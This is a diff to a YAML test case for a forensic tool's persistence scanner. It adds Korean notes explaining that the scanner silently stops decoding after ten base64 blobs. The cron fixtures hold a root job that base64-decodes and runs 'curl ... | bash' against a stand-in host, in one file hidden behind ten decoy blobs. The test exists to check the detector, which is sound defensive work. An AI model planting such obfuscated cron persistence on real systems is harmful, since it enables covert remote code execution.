@@ -11,10 +11,13 @@ variant: findevil-d1a8d25
 commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
 display: response
 level: mcp
-realism: possible
+realism: forced
+realism_ko: "실제 cron 파일 앞에 base64 덩어리 10개가 오는 일은 드물고, 이 파일은 `base64 -d` 때문에 이미 high 등급 `obfuscated execution`으로 표시되어 모델이 놓치지 않는다."
 coverage: full
 summary: A cron file whose base64 payload (curl ... | bash) comes after ten harmless base64 blobs is not reported with "outbound download (decoded from base64)", while the same payload alone in another file is, and find_persistence does not say it stopped decoding after ten blobs.
 summary_ko: "base64 페이로드(curl ... | bash)가 무해한 base64 덩어리 열 개 뒤에 오는 cron 파일은 \"outbound download (decoded from base64)\"로 보고되지 않고, 같은 페이로드만 있는 다른 파일은 보고된다. find_persistence는 덩어리 열 개 뒤에 디코딩을 멈췄다고 말하지 않는다."
+defect_ko: "정상이라면 파일 안의 base64를 모두 풀어 보거나 일부만 풀었다고 밝혀야 하는데, 이 서버는 앞 10개만 풀고 말이 없다. 그래서 11번째 이후에 숨긴 내려받기 명령은 보고되지 않는다."
+setup_ko: "무해한 base64 주석 10줄 뒤에 base64로 감싼 `curl ... | bash` 작업을 둔 cron 파일과, 그 작업만 있는 cron 파일을 넣었다."
 fixture:
   - path: case1/etc/cron.d/job
     text: "# blob00 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMCBvaw==\n# blob01 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMSBvaw==\n# blob02 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMiBvaw==\n# blob03 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwMyBvaw==\n# blob04 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNCBvaw==\n# blob05 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNSBvaw==\n# blob06 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNiBvaw==\n# blob07 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwNyBvaw==\n# blob08 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOCBvaw==\n# blob09 YnVpbGQgYXJ0aWZhY3QgY2hlY2tzdW0gcmVjb3JkIG51bWJlciAwOSBvaw==\n*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
@@ -22,15 +25,20 @@ fixture:
     text: "*/10 * * * * root echo Y3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjcveC5zaCB8IGJhc2g= | base64 -d | sh\n"
 steps:
   - tool: find_persistence
+    note_ko: "결함이 있는 호출: 앞에 base64 10개가 있는 파일"
     args:
       root_path: ${EVIDENCE}/case1
   - tool: find_persistence
+    note_ko: "비교용: 같은 작업만 있는 파일"
     args:
       root_path: ${EVIDENCE}/case2
 expect:
   - step: 1
+    note_ko: "숨긴 내려받기 명령이 보고되지 않는다"
     not_contains: "outbound download (decoded from base64)"
   - step: 1
+    note_ko: "10개만 풀었다는 말이 없다"
     not_regex: "(?i)first 10|only .*blobs|skipped"
   - step: 2
+    note_ko: "같은 작업만 있으면 숨긴 내려받기 명령을 보고한다"
     contains: "outbound download (decoded from base64)"
